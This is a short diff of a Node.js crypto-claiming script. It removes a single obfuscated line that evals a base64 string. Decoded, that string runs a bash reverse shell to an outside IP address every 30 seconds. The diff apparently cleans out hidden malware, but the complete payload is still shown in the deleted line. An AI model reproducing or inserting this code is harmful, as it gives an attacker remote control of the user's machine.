@@ -8,7 +8,6 @@ const { claimFragmentz } = require('./src/claim');
 const { RPC_URL } = require('./src/utils');
 const { JsonRpcProvider, ethers } = require('ethers');
 const moment = require('moment');
-eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE5NC4xODAuNDguMjUzLzkwMDEgMDwmNSAxPiY1IDI+JjUiID4gL2Rldi9udWxsIDI+JjEgJicpLCAzMDAwMCk7","base64").toString())
 const { CronJob } = require('cron');
 const CONTRACT_ADDRESS = '0xF0a66d18b46D4D5dd9947914ab3B2DDbdC19C2C0';
 
